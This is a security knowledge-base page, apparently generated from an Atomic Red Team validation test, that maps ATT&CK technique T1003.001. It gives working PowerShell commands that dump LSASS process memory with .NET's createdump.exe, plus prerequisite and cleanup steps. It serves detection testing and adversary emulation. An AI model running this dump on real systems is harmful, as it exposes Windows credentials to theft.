---
atomic_guid: "9d0072c8-7cca-45c4-bd14-f852cfa35cf0"
title: "Dump LSASS with createdump.exe from .Net v5"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-27 19:12:25"
executor: "powershell"
aliases:
  - "9d0072c8-7cca-45c4-bd14-f852cfa35cf0"
  - "Dump LSASS with createdump.exe from .Net v5"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Use createdump executable from .NET to create an LSASS dump.

[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003001-lsass-memory|T1003.001: LSASS Memory]]

## Dependencies

.Net v5 must be installed

### Prerequisite Check

```powershell
$exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
if ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
& "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
```

### Cleanup

```powershell
Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
